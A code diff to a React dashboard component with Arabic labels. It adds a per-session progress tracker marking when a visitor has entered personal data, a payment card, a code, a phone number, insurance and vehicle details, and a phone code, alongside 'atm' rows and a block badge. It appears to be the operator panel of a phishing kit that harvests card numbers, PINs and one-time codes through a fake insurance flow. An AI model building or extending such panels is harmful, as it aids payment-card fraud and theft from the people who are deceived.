@@ -231,7 +231,7 @@ function SessionBox({
   newCardId: number | null;
   onViewCard: () => void;
 }) {
-  const [expanded, setExpanded] = useState(true);
+  const [expanded, setExpanded] = useState(false); // مغلقة افتراضياً
   const [historyExpanded, setHistoryExpanded] = useState(false);
   const [loadingAction, setLoadingAction] = useState<string | null>(null);
 
@@ -248,8 +248,26 @@ function SessionBox({
   const atmRows = rows.filter((row) => row.type === "atm");
   const nomerRows = rows.filter((row) => row.type === "nomer");
   const nomerOtpRows = rows.filter((row) => row.type === "nomer_otp");
+  const vehicleRows = rows.filter((row) => row.type === "vehicle");
   // Use first row (newest) for lastActivity since rows are sorted desc by id
   const lastActivity = rows[0]?.createdAt;
+
+  // Build progress status
+  const progressSteps = [
+    { key: "initial", label: "تم ادخال بيانات", completed: !!initialRow },
+    { key: "card", label: "تم ادخال بطاقة", completed: cardRows.length > 0 },
+    { key: "otp", label: "تم ادخال رمز", completed: otpRows.length > 0 },
+    { key: "phone", label: "تم ادخال رقم هاتف", completed: nomerRows.length > 0 },
+    { key: "insurance", label: "تم اختيار تامين", completed: !!initialData.insuranceType },
+    { key: "vehicle", label: "تم ادخال تفاصيل مركبة", completed: vehicleRows.length > 0 },
+    { key: "nomerOtp", label: "تم ادخال رمز الهاتف", completed: nomerOtpRows.length > 0 },
+  ];
+
+  // Find the current step (last completed or current)
+  const currentStepIndex = progressSteps.findIndex(step => !step.completed);
+  const displaySteps = currentStepIndex === -1 
+    ? progressSteps.map((step, i) => ({ ...step, isCurrent: i === progressSteps.length - 1 }))
+    : progressSteps.map((step, i) => ({ ...step, isCurrent: i === currentStepIndex }));
 
   const statusBadge = blocked
     ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
@@ -325,7 +343,22 @@ function SessionBox({
                   </div>
                 </div>
                 <div className="mt-2 flex items-center justify-between gap-2">
-                  {statusBadge}
+                  <div className="flex items-center gap-1 flex-wrap">
+                    {displaySteps.map((step, index) => (
+                      <span
+                        key={step.key}
+                        className={`text-[10px] px-1.5 py-0.5 rounded-full ${
+                          step.completed
+                            ? "bg-green-100 text-green-700"
+                            : step.isCurrent
+                              ? "bg-blue-100 text-blue-700 animate-pulse"
+                              : "bg-slate-100 text-slate-400"
+                        }`}
+                      >
+                        {step.completed ? "✓" : "○"} {step.label}
+                      </span>
+                    ))}
+                  </div>
                   <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                 </div>
               </button>
